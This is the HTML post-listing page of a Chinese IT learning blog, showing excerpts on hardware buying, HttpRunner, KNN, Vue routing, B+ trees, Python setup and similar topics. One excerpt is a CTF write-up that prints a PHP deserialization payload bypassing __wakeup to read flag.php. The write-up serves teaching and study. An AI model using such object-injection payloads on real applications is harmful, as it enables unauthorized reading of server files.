<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f277e57ef641b19dd972508d3e710c0c/" rel="bookmark">
			硬件选择标准（以及处理方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		所有硬件应该尽可能通过软启动方法，而非硬启动；除非没人办法。
无线路由器报价
http://detail.zol.com.cn/wireless_router/
条码打印机报价
http://detail.zol.com.cn/barcode_printer/
无线鼠标
http://detail.zol.com.cn/mice/
扫描仪判断标准
1、扫描仪主要看分辨率；
针式机选择标准
1、每天打印量
2、几连纸
3、纸张的宽度和长度
条码机标准
1、每天打印量
2、纸张类型及大小
3、条码机用的纸，铜板纸，热敏纸
会议电话
1、可以mute功能；
2、声音要大；
3、有录音功能
显示器
1、显示器是否可以升降！
2、显示器的连接线标准是多少，是否较短！
交换机
1：买交换机一定要注意交换机和箱子是否适合
企业级路由器和家用路由器的区别
1.企业级路由器的CPU,缓存，内存等硬件参数更高，NAT转发数更多，支持同时接入上网的用户数量更多。
2.从软件功能上来看，企业级路由器支持的协议标准及软件管理功能更多，为满足企业各种网络的需求，有些支持VPN，有些支持流量控制，有些支持多种虚拟服务和更多路由协议。
3.企业级路由器价格比家用路由器更贵。
4.如果是无线路由器，企业级无线路由器支持的无线接入用户数及总的接入用户数都比普通家用路由器更多。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e89b366f69c728ea5d0bba51ea613ef/" rel="bookmark">
			HttpRunner 使用注意点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、基本规则
API接口定义必须放置在api目录下
模块定义必须放置在suite目录下
测试场景文件必须放置在testcases目录下
相关的函数定义放置在debugtalk.py中
变量的申明和引用 在 HttpRunner 中，支持变量申明（variables）和引用（$var）的机制。在 config 和 test 中均可以通过 variables 关键字定义变量，然后在测试步骤中可以通过 $ + 变量名称 的方式引用变量。区别在于，在 config 中定义的变量为全局的，整个测试用例（testcase）的所有地方均可以引用；在 test 中定义的变量作用域仅局限于当前测试步骤（teststep）。
数据参数化
数据驱动
2、运行用例过程中开启fidder，不然会报错
3、报错expected &lt;block end&gt;, but found BlockMappingStart
yml 文件的内容格式问题，解决方法：
在配置文件yml中：
每个配置行前需要有空格
每个： 两边需要有空格
数组中间加空格
还有注释掉的参数不能在#后边加空格不然报错
4、header 中添加referer
如果后端对访问进行了限制，导致无法直接调口时，需要在config-headers中加入Referer字段，写入地址链接
api: def: clearImportData($cookie, $userNo) variables: - uri: "/pro/roomImport/clearImportData/$userNo" request: url: $uri headers: Referer: XXXXXXXXXX method: GET 5、上传文件 multipart/form-data方式
比如导入excel文件，content-type很重要，一定要写正确
- api: def: importRoom($cookie, $userNo) name: "导入数据" variables: - uri: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e89b366f69c728ea5d0bba51ea613ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a2cc1c4876dbee577805d6dd83cd220/" rel="bookmark">
			K近邻分类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		K最近邻(k-Nearest Neighbor，KNN)分类算法，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路是：如果一个样本在特征空间中的k个最相似(即特征空间中最邻近)的样本中的大多数属于某一个类别，则该样本也属于这个类别。
下面以比较著名的鸾尾花（Iris）数据集举例，讲解K近邻算法
首先我们先导入数据
from sklearn.datasets import load_iris iris = load_iris() print(iris.data.shape) print(iris.data) 可以看到Iris数据集共有150朵鸾尾花的样本，因为没有测试数据，所以我们随机采用其中75%的数据作为训练数据，采用剩余的25%的数据作为测试数据
下面对Iris数据集进行分割
from sklearn.cross_validation import train_test_split X_train,X_test,Y_train,Y_test = train_test_split(iris.data,iris.target,test_size=0.25,random_state=33) 分割完成后，到了训练部分，这里我们使用K近邻分类器对鸾尾花的数据进行类别预测
from sklearn.preprocessing import StandardScaler from sklearn.neighbors import KNeighborsClassifier ss = StandardScaler() X_train = ss.fit_transform(X_train) X_test = ss.transform(X_test) knc = KNeighborsClassifier() knc.fit(X_train,Y_train) Y_predict = knc.predict(X_test) 将预测结果存在Y_predict中
最后我们使用模型自带的评估函数对K近邻分类器在鸾尾花数据上的预测性能进行评估
可以看到，K近邻分类器对38条鸾尾花测试样本的准确性约为89.47%，平均精确率、召回率以及F1指标分别为0.92、0.89、0.90.
K近邻算法模型没有参数训练过程，也就是说，该模型并没有通过任何学习算法分析训练数据，而是只是根据测试样本在训练数据的分布直接做出分类决策。因此，K近邻属于无参数模型中非常简单的一种。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b710ecba74e81431398b121964b8259c/" rel="bookmark">
			升级safari 12版本，easyconnectplugin插件等不能使用解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2020年6月注：目前已经不需要按照下面的教程升级了，因为官方已经修复了问题，直接找最新版本的就可以了。
升级safari 12版本，发现easyconnectplugin插件等不能使用，需要降级safari操作，就可以了。但是直接降级是不能完成的，需要按照如下操作：
1，下载safari 11版本，地址：http://m6.pc6.com/xuh6/Safari1111Sierra.pkg
下载好后安装，安装到选择安装目录的时候，选择一个/users/用户下面的任意新建目录。
当安装完之后，会发现safari等都不能使用了。
2，这个时候，再安装一下上面下载的版本，这一次就使用默认的路径不修改。安装完就可以了。
这个时候虽然看safari版本是12最新版，但是app store却提示升级。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5dcad03728eb48a69351334b2293af0/" rel="bookmark">
			关于router-link的传参以及参数的传递
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.路径：http://localhost:8081/#/test?name=1
&lt;router-link :to="{path:'/test',query: {name: id}}"&gt;跳转&lt;/router-link&gt;(id是参数)
使用：this.$route.query.id
2.路径：http://localhost:8081/#/test/1
&lt;router-link :to="'/test/'+id"&gt;跳转&lt;/router-link&gt;(id是参数)
路由：
使用：this.$route.params.id（这个id给上图路由的配置有关）
this.$route是一个数组，里面包含路由的所有信息
注意：router-link中链接如果是‘/’开始就是从根路由开始，如果开始不带‘/’，则从当前路由开始
好歹是人家写的，那我就给她一个名分，这是原创 https://blog.csdn.net/sangjinchao/article/details/70888259 侵删
转载于:https://www.cnblogs.com/czy960731/p/9669718.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35eccee1e2cf484b7437e45eaff859ba/" rel="bookmark">
			凹凸函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我擦，迷瞪了一上午，还以为人家题目出错了，凹凸函数在同济大学高等数学中的定义符合人们的思维定式。在国际上的定义恰好与同济大学高等数学中的定义相反。
1、同济大学高等数学定义：
2、国际上的定义：
国际上的定义刚好与国内的凹凸函数的定义相反。二阶导数大于0，则为凸函数，有极小值；二阶导数小于0，则为凹函数，有极大值（后面涉及到的凹凸函数，均为国际上的定义）；
3、e^x的二阶导数大于0，为凸函数；logx的二阶导数小于0，为凹函数；一元函数可以很容易的判断凹凸性，二元函数如何判断凹凸性？用到了海塞矩阵，根据海塞矩阵的正定性，判断凹凸性。
①海塞矩阵
②正定矩阵
判断海塞矩阵是否为正定矩阵；若所有特征值均不小于零，则称为半正定。 若所有特征值均大于零，则称为正定。特征值怎么求？|λE-A|=0，可以求出特征值。若主对角线上的元素都为0，则主对角线上的值为特征值。detA=|A|=对角线元素积。
③凹凸性判断（正定矩阵为凸函数）:
例题1：f(x,y)=x^2+5y^2-6x+10y+6
所有的特征值均大于0，海塞矩阵为正定矩阵，函数为凸函数。
例题2：f(x,y)=10(y^2+4x)^2+(1-4y)^2
经过行列式变化(行列式性质：把一行(列)的倍数加到另一行(列)，行列式不变)，把主对角线上的元素变为0，第一个特征值为320，第二个特征值先不计算。可以计算|A|=320*第二个特征值=对角相乘再相减，利用这个连等式，若该函数为凸函数，则第二个特征值也必须大于0，那么|A|&gt;0；320*(120y^2+160x*32)-160*160y^2=2560(5y^2-20x+4)&gt;0是f(x,y)为凸函数的条件。驻点：dz/dx=0，dz/dy=0，即x=1/64，y=1/4；而x和y的值满足5y^2-20x+4&gt;0,所以满足凸函数性质，有唯一极小值。
例题3：f(x,y)=x^2/y
根据特征值，一个为2/y，一个为0，那么y的正负决定函数的凹凸性，若y&gt;0,函数为凸函数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50fb318f1eb625802f03b6b85c05990c/" rel="bookmark">
			es6 中forEach()的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		es6 中forEach()的用法 var myArr=[
{id:1,name:“sdf”},
{id:2,name:“dfsdf”},
{id:3,name:“fff”}
]
myArr.forEach((item,index)=&gt;{
console.log(item.id);
//1,2,3
})
就是这样的 array.forEach(element =&gt; {
});
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38e8589fc95641bbb6bc28079da5e0a7/" rel="bookmark">
			adb 指令uninstall卸载android app 处理方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正常思路，想当然，两句指令搞定应该没啥毛病。
adb unstall ImageGrabber.apk adb install ImageGrabber.apk 问题来了，报错Unknown package: ImageGrabber.apk
Exception occurred while dumping: java.lang.IllegalArgumentException: Unknown package: ImageGrabber.apk at com.android.server.pm.Settings.isOrphaned(Settings.java:4134) at com.android.server.pm.PackageManagerService.isOrphaned(PackageManagerService.java:18256) at com.android.server.pm.PackageManagerService.deletePackage(PackageManagerService.java:15673) at com.android.server.pm.PackageInstallerService.uninstall(PackageInstallerService.java:888) at com.android.server.pm.PackageManagerShellCommand.runUninstall(PackageManagerShellCommand.java:792) at com.android.server.pm.PackageManagerShellCommand.onCommand(PackageManagerShellCommand.java:118) at android.os.ShellCommand.exec(ShellCommand.java:94) at com.android.server.pm.PackageManagerService.onShellCommand(PackageManagerService.java:18516) at android.os.Binder.shellCommand(Binder.java:468) at android.os.Binder.onTransact(Binder.java:367) at android.content.pm.IPackageManager$Stub.onTransact(IPackageManager.java:2387) at com.android.server.pm.PackageManagerService.onTransact(PackageManagerService.java:3147) at android.os.Binder.execTransact(Binder.java:565) 手机端根本不认识这个apk,解决办法：
将 ImageGrabber.apk整个文件解压,其中包含：AndroidManifest.xml，打开之后是乱码，别着急，需要反编译工具AXMLPrinter2.jar 给他翻译一下，将这两个文件放在同一个目录下，如D:\ImageGrabber
先命令行将目录设定为D:\ImageGrabber 然后再执行java -jar AXMLPrinter2.jar AndroidManifest.xml &gt; AndroidManifest.txt，前提是PC端装好了Java环境，特别是要注意设置好PC端的环境变量。
C:\Users\Antony WU&gt;d: D:\&gt;cd ImageGrabber D:\ImageGrabber&gt;java -jar AXMLPrinter2.jar AndroidManifest.xml &gt; AndroidManifest.txt 执行完成后，用notepad++打开AndroidManifest.txt，其中第6行就是所要的答案了package="com.qualcomm.vr.callibrationtool"
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;manifest xmlns:android="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38e8589fc95641bbb6bc28079da5e0a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c8280fc9957fcd8cde35cdb6f6920ef/" rel="bookmark">
			快速了解B&#43;树的插入、删除操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		B+树非常的复杂，这里不进行详细的讲解，只对基本的插入删除操作进行说明。
在B+树中，所有记录节点都是按键值的大小顺序存放在同一层的叶节点中，各叶节点用指针连接。因此在进行插入删除操作时，要进行调整，维持其平衡性。
我们先来看一个B+树，其高度为2，每页可存放4条记录，扇出（fan out）为5，可以理解成5阶多叉树。
可以看出，所有记录都在叶节点中，并且是顺序存放的，如果我们从最左边的叶节点开始顺序遍历，可以得到所有键值的顺序排序：5、10、15、20、25、30、50、55、60、65、75、80、85、90。
1、插入 B+树的插入必须保证插入后叶节点中的记录依然排序，同时需要考虑插入B+树的三种情况，每种情况都可能会导致不同的插入算法，如表5-1所示。
我们用实例来分析B+树的插入，我们插入28这个键值，发现当前Leaf Page和Index Page都没有满，我们直接插入就可以了。
这次我们再插入一条70这个键值，这时原先的Leaf Page已经满了，但是Index Page还没有满，符合表5-1的第二种情况，这时插入Leaf Page后的情况为50、55、60、65、70。我们根据中间的值60拆分叶节点。
因为图片显示的关系，这次我没有能在各叶节点加上双向链表指针。最后我们来插入记录95，这时符合表5-1讨论的第三种情况，即Leaf Page和Index Page都满了，这时需要做两次拆分。
可以看到，不管怎么变化，B+树总是会保持平衡。但是为了保持平衡，对于新插入的键值可能需要做大量的拆分页（split）操作，而B+树主要用于磁盘，因此页的拆分意味着磁盘的操作，应该在可能的情况下尽量减少页的拆分。因此，B+树提供了旋转（rotation）的功能。
旋转发生在Leaf Page已经满了、但是其左右兄弟节点没有满的情况下
可以看到，采用旋转操作使B+树减少了一次页的拆分操作，而这时B+树的高度依然还是2。
2、删除 a）初始状态
b）删除22
c）删除15
删除后当前结点只有一个key,不满足条件，而兄弟结点有三个key，可以从兄弟结点借一个关键字为9的记录,同时更新将父结点中的关键字由10也变为9，删除结束。
d）删除7
当前结点关键字个数小于2，（左）兄弟结点中的也没有富余的关键字（当前结点还有个右兄弟，不过选择任意一个进行分析就可以了，这里我们选择了左边的），所以当前结点和兄弟结点合并，并删除父结点中的key，当前结点指向父结点。
此时当前结点的关键字个数小于2，兄弟结点的关键字也没有富余，所以父结点中的关键字下移，和两个孩子结点合并，结果如下图所示。
参考资料：
[1].B+树介绍 https://www.cnblogs.com/wade-luffy/p/6292784.html#_label0_1
[2].B树和B+树的插入、删除图文详解 https://www.cnblogs.com/nullzx/p/8729425.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae67c5d873f9e726ce3937bd2a6f6cb6/" rel="bookmark">
			ImportError: No module named pkg_resources解决方案  CentOS6.5上安装Python2.7和PIP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ImportError: No module named pkg_resources解决方案 CentOS6.5 默认python2.6 这种问题很可能是升级python2.7导致的
目前大部分用户使用的CentOS6.5上默认的Python还是2.6版本。升级到Python2.7碰到很多问题。本文将介绍如何安装Python2.7。
1. 安装必要的准备包
安装过程将用到gcc，方便起见，安装“Development Tools”
yum groupinstall "Development tools" 另外，Python安装中需要的一些依赖包
yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel 2. 下载安装Python2.7
目前Python2.7的最新版本是2.7.11。可以在下面的网站查询：
https://www.python.org/ftp/python/
2.7.11的下载链接是：
https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz tar vxf Python-2.7.11.tgz cd Python-2.7.11.tgz ./configure --prefix=/usr/local make &amp;&amp; make install 安装完成后，通过运行python，可以看到版本
&gt;&gt;&gt; import sys &gt;&gt;&gt; sys.version '2.7.11 (default, May 6 2016, 01:38:00) \n[GCC 4.4.7 20120313 (Red Hat 4.4.7-16)]' 3.安装pip
pip是python的安装工具，很多python的常用工具，都可以通过pip进行安装。
要安装pip，首先要安装setuptools。下面的链接可以得到相关信息，
https://pypi.python.org/pypi/setuptools
下载链接：
https://pypi.python.org/packages/ff/d4/209f4939c49e31f5524fa0027bf1c8ec3107abaf7c61fdaad704a648c281/setuptools-21.0.0.tar.gz#md5=81964fdb89534118707742e6d1a1ddb4
同样的，进行安装：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae67c5d873f9e726ce3937bd2a6f6cb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0acb7b190fa54b8d08fca12310269881/" rel="bookmark">
			从一道CTF题学习PHP反序列化漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、CTF题目 前阵子，参加了一个CTF比赛，其中有一条道题蛮有意思的，所以写出来分享一下。
此题利用了PHP的反序列化漏洞，通过构造特殊的Payload绕过__wakeup()魔术方法，从而实现注入目的，废话不多说，主要源码如下：
class SoFun{ protected $file='index.php'; function __destruct(){ if(!empty($this-&gt;file)) { if(strchr($this-&gt; file,"\\")===false &amp;&amp; strchr($this-&gt;file, '/')===false) show_source(dirname (__FILE__).'/'.$this -&gt;file); else die('Wrong filename.'); }} function __wakeup(){ $this-&gt; file='index.php'; } public function __toString(){return '' ;}} if (!isset($_GET['file'])){ show_source('index.php'); } else{ $file=base64_decode( $_GET['file']); echo unserialize($file ); } ?&gt; #&lt;!--key in flag.php--&gt; 1、代码审计 审计代码，可以发现要得到KEY，思路如下： 1、源码最后提示，KEY在flag.php里面； 2、注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来 show_source(dirname(FILE).’/‘.$this-&gt;file)，这个是解题关键； 3、若POST“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用__destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）； 4、上面的分析是多么美好，但从代码分析可以知道，还有__wakeup这个拦路虎，通过unserialize反序列化之后，也会调用__wakeup方法，它会把file设为index.php； 5、总结下来就是，想办法把file设为flag.php，调用__destruct方法，且绕过__wakeup。
2、PHP反序列化对象注入漏洞 上网查资料，发现原来这个CTF题目是根据PHP反序列化对象注入漏洞改编的。
简单来说，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。举个栗子，比如有个Student类，里面有个参数为name。 实际情况：O:7:”Student”:1:{S:4:”name”;s:8:”zhangsan”;} Payload：O:7:”Student”:2:{S:4:”name”;s:8:”zhangsan”;}
Payload对象属性个数为2，而实际属性个数为1，那么就会掉入漏洞，从而跳过wakeup()方法。
3、CTF Payload 明确了这些之后，就可以构造出Payload了，需反序列化的对象为：
O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}
O:5:”SoFun” 指的是 类：5个字符：SoFun
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0acb7b190fa54b8d08fca12310269881/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66104e4daec5902a2fd1e5c9aad0e3ec/" rel="bookmark">
			argparse命令行解析模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		argparse命令行解析模块 基本用法ArgumentParser对象add_argument（）方法parse_args（）方法其他工具官方文档 argparse命令行解析模块 导入包
import argparse
基本用法 import argparse # 导入包 parser = argparse.ArgumentParser() # 构造解析器对象 parser.add_argument("echo") # 添加属性 args = parser.parse_args() # 解析参数 print(args.echo) # 获取输入的参数 ArgumentParser对象 class ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars='-', fromfile_prefix_chars=None, argument_default=None, conflict_handler='error', add_help=True)
PROG -程序的名称（默认：sys.argv[0]） usage - 描述程序用法的字符串（默认值：从添加到解析器的参数生成） description - 参数help之前显示的文本（默认值：none） epilog - 参数help后显示的文本（默认值：none） parents - ArgumentParser还应包含其参数的对象列表(相当于继承其他解析器的参数,不能覆盖重新,父解析器指定add_help=False,防止help参数冲突) formatter_class - 用于自定义帮助输出的类:
argparse.RawDescriptionHelpFormatter:表示描述和收尾已经正确格式化argparse.RawTextHelpFormatterargparse.ArgumentDefaultsHelpFormatterargparse.MetavarTypeHelpFormatter prefix_chars - 前缀可选参数的字符集（默认值：’ - ‘）,例如:prefix_chars=’-+’ fromfile_prefix_chars -特定符号（默认值：None）,参数中此特定符号加文件名表示读取该文件的内容,作为参数.文件的每行代表一个参数,顺序表示在命令行中的顺序 argument_default -为参数的全局默认值（默认值：None） conflict_handler - 解决冲突选项的策略（通常是不必要的）,conflict_handler=’resolve’ add_help -添加-h/–help选项解析器（默认值：True） allow_abbrev - 如果缩写是明确的，则允许缩写长选项。（默认值：True）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66104e4daec5902a2fd1e5c9aad0e3ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13c4a820fe1f030cbea4b114260ef072/" rel="bookmark">
			8、最少交换次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（个人水平有限，请见谅！）
描述： 给出一个无序数列，每次只能交换相邻两个元素，求将原数列变成递增数列的最少交换次数。 如：数列：2,3,1，交换3和1后变成：2,1,3；交换1和2之后变成：1,2,3。总共交换2次。
输入： 逗号隔开的正整数数列。
输出： 正整数。
输入样例： 2,3,1 输出样例： 2 代码示例： #include &lt;iostream&gt; #include &lt;bits/stdc++.h&gt; #include &lt;vector&gt; #include &lt;string&gt; using namespace std; int main() { char line[1000001]; int temp = 0; while (cin.getline(line, 1000000)) { vector&lt;int&gt; vec; int num = 0; int temp = 0; int sum = 0; int min = INT_MAX; char *p = strtok(line, ","); while(p){ sscanf(p, "%d", &amp;temp); vec.push_back(temp); p = strtok(NULL,","); } for (int i = 0; i &lt; vec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13c4a820fe1f030cbea4b114260ef072/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/946496219163876ed2aa817d0b6c26b0/" rel="bookmark">
			【NOIP2014提高组】寻找道路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目背景 NOIP2014 提高组 Day2 试题。
题目描述 在有向图 G 中，每条边的长度均为 1，现给定起点和终点，请你在图中找一条从起点到终点的路径，该路径满足以下条件： 1．路径上的所有点的出边所指向的点都直接或间接与终点连通。 2．在满足条件 1 的情况下使路径最短。 注意：图 G 中可能存在重边和自环，题目保证终点没有出边。 请你输出符合条件的路径的长度。
输入格式 第一行有两个用一个空格隔开的整数 n 和 m，表示图有 n 个点和 m 条边。 接下来的 m 行每行 2 个整数 x、y，之间用一个空格隔开，表示有一条边从点 x 指向点y。 最后一行有两个用一个空格隔开的整数 s、t，表示起点为 s，终点为 t。
输出格式 输出只有一行，包含一个整数，表示满足题目描述的最短路径的长度。如果这样的路径不存在，输出 -1。
样例数据 1 输入
3 2 1 2 2 1 1 3 输出
-1 样例数据 2 输入
6 6 1 2 1 3 2 6 2 5 4 5 3 4 1 5 输出
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/946496219163876ed2aa817d0b6c26b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba4eebfc1632cf51587f4ab45c1d8063/" rel="bookmark">
			日常IT技巧总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Windows问题处理技巧 Win7插入手机usb 弹出窗口关闭
按“WIN+R”弹出运行，在运行界面输入【services.msc】，点击确定，进入服务； 在服务列表找到 “Shell Hardware Detection”服务，双击打开； 在弹出的设置对话框，将服务的“启动类型”设置为“自动”，并单击“启动”，按“确定”保存设置。 再次打开“运行”，输入“gpedit.msc”并回车； 进入本地组策略界面，依次打开【计算机配置】-【管理模板】-【系统】-【所有配置】； 然后在右方列表中，找到“关闭自动播放”，双击打开； 在弹出的自动播放配置界面，勾选“已禁用”，点击“确定”即可； 经过以上设置，再插入U盘的时候，系统就会弹出提示了 Win7快速分屏的方法link
FoxMail收163邮箱link
邮箱类型建议选择为POP3，IMAP虽然能够实时推送邮件新消息，不过新手不小心删除了本地邮件的话，连服务端的也会同步删除的，POP3则可以设置不删除。 改POP3就可以成功了,自动提醒邮件 无线网络怎么设置静态ip地址link
Win10设置保护色
[HKEY_CURRENT_USER\Control Panel\Colors] windows 255 255 255 改为202 234 206 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\DefaultColors\Standard]window 双击16进制caeace 内存注册表问题处理
大多数人使用Windows操作系统有时会遇到这样的错误信息： 「“0X????????”指令引用的“0x00000000”内存，该内存不能为“read”或“written”」，然后应用程序被关闭。 一般出现这个现象有方面的，一是硬件，即内存方面有问题，二是软件，这就有多方面的问题了。 下面先说说硬件： 一般来说，内存出现问题的可能性并不大，主要方面是：内存条坏了、内存质量有问题，还有就是2个不同牌子不同容量的内存混插，也比较容易出现不兼容的情况，同时还要注意散热问题，特别是超频后。你可以使用MemTest这个软件来检测一下内存，它可以彻底的检测出内存的稳定度。 假如你是双内存，而且是不同品牌的内存条混插或者买了二手内存时，出现这个问题，这时，你就要检查是不是内存出问题了或者和其它硬件不兼容。 如果都没有，那就从软件方面排除故障了。 先简单说说原理：内存有个存放数据的地方叫缓冲区，当程序把数据放在其一位置时，因为没有足够空间，就会发生溢出现象。 这个问题，经常出现在windows2000和XP系统上，Windows 2000/XP对硬件的要求是很苛刻的,一旦遇到资源死锁、溢出或者类似Windows 98里的非法操作，系统为保持稳定，就会出现上述情况。另外也可能是硬件设备之间的兼容性不好造成的。 【1】 DOS命令输入for %1 in (%windir%\system32\*.dll) do regsvr32.exe /s %1 for %i in (%windir%\system32\*.ocx) do regsvr32.exe /s %i 前半句 『for %1 in (%windir%\\system32\\*.dll) 』是用来遍历 system32 目录下的所有dll文件，并且每找到一个dll文件，就将文件名赋值给 %1 后半句『do regsvr32.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba4eebfc1632cf51587f4ab45c1d8063/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be905c92c02d3b25059dfd0f8f618ff5/" rel="bookmark">
			python微元法计算函数曲线长度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算曲线长度，根据线积分公式： ∫BAf(x,y,z)dl ∫ A B f ( x , y , z ) d l ，令积分函数 f(x,y,z) f ( x , y , z ) 为1，即计算曲线的长度，将其微元化：
limn→∞Δl→0∑i=0nf(xi,yi,zi)Δli lim n → ∞ Δ l → 0 ∑ i = 0 n f ( x i , y i , z i ) Δ l i 其中
Δli=(Δxi)2+(Δyi)2+(Δzi)2−−−−−−−−−−−−−−−−−−−−√=(xi+1−xi)2+(yi+1−yi)2+(zi+1−zi)2−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−√ Δ l i = ( Δ x i ) 2 + ( Δ y i ) 2 + ( Δ z i ) 2 = ( x i + 1 − x i ) 2 + ( y i + 1 − y i ) 2 + ( z i + 1 − z i ) 2 根据此时便可在python编程实现，给出4个例子，代码中已有详细注释，不再赘述
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be905c92c02d3b25059dfd0f8f618ff5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7390555915e77497b13243807e5752c/" rel="bookmark">
			【C&#43;&#43;】对于结构体数组，如果没有初始化，那么全部数组内元素会被全部赋成0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;stdio.h&gt; struct{ char *name; //姓名 int num; //学号 int age; //年龄 char group; //所在小组 float score; //成绩 }Class[8] = {	//可以不给出数组长度，如果给的是空的，全部初始化成0 { "Li ping", 5, 18, 'C', 145.0 }, { "Zhang ping", 4, 19, 'A', 130.5 }, { "He fang", 1, 18, 'A', 148.5 }, { "Cheng ling", 2, 17, 'F', 139.0 }, { "Wang ming", 3, 17, 'B', 144.5 } }; int main(){ int i, num_140 = 0; float sum = 0; for (i = 0; i&lt;8; i++){ sum += Class[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7390555915e77497b13243807e5752c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09b4cc07b50926b3e0499bf2b5ab220d/" rel="bookmark">
			流程图
